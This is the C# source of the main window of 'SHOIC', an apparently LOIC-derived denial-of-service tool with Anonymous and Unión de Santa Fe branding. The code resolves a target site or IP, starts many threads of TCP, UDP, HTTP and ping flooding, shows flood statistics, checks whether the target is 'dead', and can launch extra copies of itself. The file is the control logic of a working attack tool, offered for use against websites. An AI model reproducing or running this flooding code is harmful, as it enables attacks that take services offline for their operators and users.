/*
 * Creado por SharpDevelop.
 * Usuario: SANTAFEHACK
 * Fecha: 24/04/2012
 * Hora: 08:59 p.m.
 * 
 * Para cambiar esta plantilla use Herramientas | Opciones | Codificación | Editar Encabezados Estándar
 */
#region [Using]
using System;
using System.Data;
using System.Linq;
using System.Net;
using System.Windows.Forms;
using System.Globalization;
using System.Media;
using System.IO;
using NAudio.Wave;
//using WMPLib;

#endregion [Using]

namespace SHOIC
{
public partial class WindowFirst : Form
{
	
#region [Moviement API Windows]
//
// Declaraciones del API de Windows (y constantes usadas para mover el form)
//
const int WM_SYSCOMMAND = 0x112;
const int MOUSE_MOVE = 0xF012;
//
// Declaraciones del API
[System.Runtime.InteropServices.DllImport("user32.DLL", EntryPoint="ReleaseCapture")]
private extern static void ReleaseCapture();
//
[System.Runtime.InteropServices.DllImport("user32.DLL", EntryPoint="SendMessage")]
private extern static void SendMessage(System.IntPtr hWnd, int wMsg, int wParam, int lParam);
//
#endregion
		
#region [Global]
private bool attack;
private static IFlooder[] arr;
//private static HTTPFlooderSHOIC[] arr2;
private static string sIP, sData, sSubsite;
private static int iPort, iThreads, iProcess,iProtocol, iDelay, iTimeout;
private static bool bResp, intShowStats;
private static WindowSoldier[] arrvent;
private static SHOICPing[] arrping;

private IWavePlayer waveOutDevice;
private AudioFileReader audioFileReader;		

public BindingSource BindingSourceProxys=new BindingSource();
public BindingSource BindingSourceAutoCompletado=new BindingSource();
public SHOICSQLite shoicsqliteautocomplete;
public SHOICSQLite shoicsqlite;
public StructConexion stconexion=new StructConexion();
		
#endregion [Global]

#region [Constructor]
public WindowFirst()
{
			
InitializeComponent();
			
//CargarProxys();
//CargarAutoCompletado();
		
this.MouseMove += new System.Windows.Forms.MouseEventHandler(this.MoverFormulario);
//tbSpeed.Enabled=false;
vSetMusic();
}
#endregion [Constructor]

//Inicio Marcha del TATE (Unión de Santa Fe)
void vSetMusic()
{
try
{
this.waveOutDevice.Stop();
}
catch
{
}
this.waveOutDevice = new WaveOut();
this.audioFileReader = new AudioFileReader("MUSIC\\Union de Santa Fe Marcha Heavy Metal.mp3");
this.waveOutDevice.Init(this.audioFileReader);
this.waveOutDevice.Play();
}	


#region Event handlers
private void WindowFirstLoad(object sender, EventArgs e)
{
//this.Text = String.Format("{0} | Somos Anonymous Santa Fe | v. {1}", Application.ProductName, Application.ProductVersion);
	
try{cbMethod.SelectedIndex=3;}catch{}
}
 
private void cmdTargetURL_Click(object sender, EventArgs e)
{
TargetisURL();
}

private void TargetisURL()
{
//string url = txtTargetURL.Text.ToLower();
string url = ComboTargetURL.Text.ToLower();
AgregarURL();

if (url.Length == 0)
{
//using (var wmessage = new WindowMessage())
{
//wmessage.Show();
MessageBox.Show("Te olvidaste la dirección web.", "Anonymous");
}
return;
}
if (url.StartsWith("https://")) url = url.Replace("https://", "http://");
else if (!url.StartsWith("http://")) url = String.Concat("http://", url);
try
{
try{
txtTarget.Text = Dns.GetHostEntry(new Uri(url).Host).AddressList.Single().ToString();
}catch
{
MessageBox.Show("URL no válida. Asegurate de que exista y de que colocaste bien el nombre.");
}
				
}
catch(System.InvalidOperationException)
{
//using (var wmessage = new WindowMessage())
{
//wmessage.Show();
MessageBox.Show("Escribí la dirección completa. VIVA UNIÓN.", "Viva Unión!!!");
}
}
			
}
		
private void TargetisIP(){
if (txtTargetIP.Text.Length == 0)
{
//using (var wmessage = new WindowMessage())
{
//wmessage.Show();
MessageBox.Show("Te olvidaste la IP.", "Anonymous");
}
return;
}
txtTarget.Text = txtTargetIP.Text;
		    
}

private void cmdTargetIP_Click(object sender, EventArgs e)
{TargetisIP();}

private void txtTarget_Enter(object sender, EventArgs e)
{
ButtonAttack.Focus();
}

private void ClickAttack(object sender, EventArgs e)
{
if (!attack)
{
attack = true;
try
{
sIP = txtTarget.Text;

//if (!Int32.TryParse(txtPort.Text, out iPort))
//throw new Exception("Colocar puerto correctamente.");
//SHOIC


iThreads=int.Parse(NumericUpDownThreads.Value.ToString());
//FIN SHOIC
//				if (!Int32.TryParse(txtThreads.Text, out iThreads))
//					throw new Exception("What on earth made you put THAT in the threads field?");

if (String.IsNullOrEmpty(txtTarget.Text) || String.Equals(txtTarget.Text, "Ninguno!"))
throw new Exception("Agrega una URL (Dirección Web) o una IP para atacar");

iProtocol = 0;
if (String.Equals(cbMethod.Text, "TCP")) iProtocol = 1;
if (String.Equals(cbMethod.Text, "UDP")) iProtocol = 2;
if (String.Equals(cbMethod.Text, "HTTP")) iProtocol = 3;
if (String.Equals(cbMethod.Text, "HTTP SHOIC")) iProtocol = 4;
if (String.Equals(cbMethod.Text, "PING SHOIC")) iProtocol = 5;
if (iProtocol == 0)
throw new Exception("Seleccionar un método de ataque.");

sData = txtData.Text.Replace("\\r", "\r").Replace("\\n", "\n");
if (String.IsNullOrEmpty(sData) && (iProtocol == 1 || iProtocol == 2))
throw new Exception("Gonna spam with no contents? You're a wise fellow, aren't ya? o.O");

if (!txtSubsite.Text.StartsWith("/") && (iProtocol == 3))
throw new Exception("You have to enter a subsite (for example \"/\")");
else
sSubsite = txtSubsite.Text;

if (!Int32.TryParse(txtTimeout.Text, out iTimeout))
throw new Exception("What's up with something like that in the timeout box? =S");

bResp = chkResp.Checked;
}
catch (Exception ex)
{
//using (var wmessage = new WindowMessage())
{
//wmessage.Show();
MessageBox.Show(ex.Message, "What the shit.");
}
attack = false;
return;
}

ButtonAttack.Text = "Detener Ataque!";

if (iProtocol == 1 || iProtocol == 2)
{
arr = new XXPFlooder[iThreads];
for (int a = 0; a < arr.Length; a++)
{
arr[a] = new XXPFlooder(sIP, iPort, iProtocol, iDelay, bResp, sData);
arr[a].Start();
}
					
}
if (iProtocol == 3)
{
arr = new HTTPFlooder[iThreads];
for (int a = 0; a < arr.Length; a++)
{
arr[a] = new HTTPFlooder(sIP, iPort, sSubsite, bResp, iDelay, iTimeout);
arr[a].Start();
}
}
				
if (iProtocol == 4)
{	arrvent = new  WindowSoldier[iThreads];
for (int a = 0; a < arrvent.Length; a++)
{
arrvent[a] = new WindowSoldier(sIP, iPort,iDelay,sData,ref lbRequesting,ref lbFailed);
//arrvent[a].Start();
//arr2[a].Start();
}
}

if (iProtocol == 5)
{	
arrping= new SHOICPing[iThreads];

for (int a = 0; a < arrping.Length; a++)
{
arrping[a] = new SHOICPing(sIP,iDelay);
}
}


tShowStats.Start();
}
else
{
attack = false;
ButtonAttack.Text = "COMENZAR ATAQUE!";
tShowStats.Stop();
arr =new XXPFlooder[0];
int i=0;
try{
while(i<arrvent.Count())
{
arrvent[i].Stop();
arrvent[i].Close();
i++;
}
}catch{}
arrvent=null;
				
while(i<arr.Count()){
arr[i]=null;i++;}
arr=null;
//Application.Restart();//.ExitThread();
//Liberar recursos
}
}

private void tShowStats_Tick(object sender, EventArgs e)
{
if (intShowStats) return; intShowStats = true;

bool isFlooding = false;
			if (iProtocol == 1 || iProtocol == 2)
			{
				int iFloodCount = arr.Cast<XXPFlooder>().Sum(f => f.FloodCount);
				lbRequested.Text = iFloodCount.ToString(CultureInfo.InvariantCulture);
			}
			if (iProtocol == 3)
			{
				int iIdle = 0;
				int iConnecting = 0;
				int iRequesting = 0;
				int iDownloading = 0;
				int iDownloaded = 0;
				int iRequested = 0;
				int iFailed = 0;

				for (int a = 0; a < arr.Length; a++)
				{
					HTTPFlooder httpFlooder = (HTTPFlooder)arr[a];
					iDownloaded += httpFlooder.Downloaded;
					iRequested += httpFlooder.Requested;
					iFailed += httpFlooder.Failed;
					switch (httpFlooder.State)
					{
						case ReqState.Ready:
						case ReqState.Completed:
							{
								iIdle++;
								break;
							}
						case ReqState.Connecting:
							{
								iConnecting++;
								break;
							}
						case ReqState.Requesting:
							{
								iRequesting++;
								break;
							}
						case ReqState.Downloading:
							{
								iDownloading++;
								break;
							}
					}
					if (isFlooding && !httpFlooder.IsFlooding)
					{
						int iaDownloaded = httpFlooder.Downloaded;
						int iaRequested = httpFlooder.Requested;
						int iaFailed = httpFlooder.Failed;
						httpFlooder = new HTTPFlooder(sIP, iPort, sSubsite, bResp, iDelay, iTimeout)
						{
							Downloaded = iaDownloaded,
							Requested = iaRequested,
							Failed = iaFailed
						};
						httpFlooder.Start();
						arr[a] = httpFlooder;
					}
				}
				lbFailed.Text = iFailed.ToString(CultureInfo.InvariantCulture);
				lbRequested.Text = iRequested.ToString(CultureInfo.InvariantCulture);
				lbDownloaded.Text = iDownloaded.ToString(CultureInfo.InvariantCulture);
				lbDownloading.Text = iDownloading.ToString(CultureInfo.InvariantCulture);
				lbRequesting.Text = iRequesting.ToString(CultureInfo.InvariantCulture);
				lbConnecting.Text = iConnecting.ToString(CultureInfo.InvariantCulture);
				lbIdle.Text = iIdle.ToString(CultureInfo.InvariantCulture);
			}

			intShowStats = false;
		}

private void tbSpeed_ValueChanged(object sender, EventArgs e)
{
iDelay = tbSpeed.Value;
if (arr != null)
{
foreach (var f in arr)
{
f.Delay = iDelay;
}

}
}
#endregion

#region {New Mehtods SHOIC}
void CargarAutoCompletado()
{
stconexion.server="DATA\\proxys.sqlite3; Version=3;New=True;Compress=True;";
stconexion.table="autocompletado";
shoicsqliteautocomplete=new SHOICSQLite(ref BindingSourceAutoCompletado,stconexion);
shoicsqliteautocomplete.CrearBBDDSiNoExiste();
shoicsqliteautocomplete.CargarRegistros();
ComboTargetURL.DataSource=BindingSourceAutoCompletado.DataSource;	
ComboTargetURL.ValueMember="codigo_auto";
ComboTargetURL.DisplayMember="direccion_auto";
}
void CargarProxys()
{
stconexion.server="DATA\\proxys.sqlite3; Version=3;New=True;Compress=True;";
stconexion.table="proxys";
shoicsqlite=new SHOICSQLite(ref BindingSourceProxys,stconexion);
//MessageBox.Show("LLEGA");
shoicsqlite.CrearBBDDSiNoExiste();
shoicsqlite.CargarRegistros();
}
void AgregarURL()
{
string autocompletadito=ComboTargetURL.Text;
autocompletadito=autocompletadito.ToLower();
int i=0;
int pos=BindingSourceAutoCompletado.Find("direccion_auto",autocompletadito);
if(pos==-1)
{
	DataRowView rowaut=(DataRowView)BindingSourceAutoCompletado.AddNew();
	rowaut["direccion_auto"]=autocompletadito;
	rowaut["codigo_auto"]=CodigoMayorAutoCompletado()+1;
	
	BindingSourceAutoCompletado.EndEdit();
	shoicsqliteautocomplete.bUpdate(true);
	shoicsqliteautocomplete.CargarRegistros();
	
}

}
int CodigoMayorAutoCompletado()
{
int i=0;
int max=0;
while(i<BindingSourceAutoCompletado.Count)
{
	DataRowView rowaut=(DataRowView)BindingSourceAutoCompletado[i];
int aux=0;
try{
aux=int.Parse(rowaut["codigo_auto"].ToString());
}catch{}
if(aux>max)
	max=aux;
i++;}

return max;
}

#endregion

#region [Event]
void ClickDeath(object sender, EventArgs e)
{
string starget=txtTarget.Text;//ComboTargetURL.SelectedValue.ToString();
	
SHOICPing pingsh=new SHOICPing(starget,500);

if(pingsh.bIsDead())
MessageBox.Show("Está muerta/Is Dead");	
else
MessageBox.Show("Sigue viva/Still alive");	

}
		
void ClickHelp(object sender, EventArgs e)
{
new WindowHelp().Show();
}
	
void ClickExit(object sender, EventArgs e)
{   
Close();
}
		
void ClickAnonymous(object sender, EventArgs e)
{
new WindowAbout().ShowDialog();
}
		
void ClickMask(object sender, EventArgs e)
{
MessageBox.Show("Anonymous Somos Todos.");
}


void PresionarEnter(object sender, KeyPressEventArgs e)
{
if(e.KeyChar==(Char)Keys.Enter)
{
TargetisURL();
}
}
		
void PresionarEnterIP(object sender, KeyPressEventArgs e)
{
if(e.KeyChar==(Char)Keys.Enter)
{TargetisIP();}
}

void ClickRestart(object sender, EventArgs e)
{
Application.Restart();
}
		
void ClickConfiguration(object sender, EventArgs e)
{
new WindowConfiguration(ref BindingSourceProxys, ref shoicsqlite).ShowDialog();

CargarProxys();
}
		
void ClickAddProcess(object sender, EventArgs e)
{
//Esto espor si se desmadra al abrir otro archivo
string ruta=Application.StartupPath;
//Le paso que el directorio por defecto sea el del ejecutable
Directory.SetCurrentDirectory(ruta);
		
iProcess=int.Parse(NumericProcess.Value.ToString());
int i=0;
while(i<iProcess){
System.Diagnostics.Process.Start("SHOIC.exe");//Ejecuto el archivo y se abre bloc de notas supuestamente
i++;}
}

#endregion [Event]
	
#region [Event Music]
void ClickPlay(object sender, EventArgs e)
{
vSetMusic();
}		
void ClickPausa(object sender, EventArgs e)
{
try{this.waveOutDevice.Pause();}catch{}		
}
void ClickStop(object sender, EventArgs e)
{
try{this.waveOutDevice.Stop();}catch{}
}
#endregion	[Event Music]	
		
#region [Event Window]
//Para mover Ventana	
private void moverForm() 
{
ReleaseCapture();
SendMessage(this.Handle, WM_SYSCOMMAND, MOUSE_MOVE, 0);
}  
// podemos usar el mismo procedimiento de evento para mover
private void MoverFormulario(object sender, System.Windows.Forms.MouseEventArgs e)
{
moverForm();
}
#endregion [Event Window]

		

		
void SeleccionarMétodo(object sender, EventArgs e)
{/*
if(cbMethod.SelectedIndex==3)
{
tbSpeed.Enabled=false;
}
else
{
tbSpeed.Enabled=true;
}*/
		}
		
}//End class
}//Endnamespace


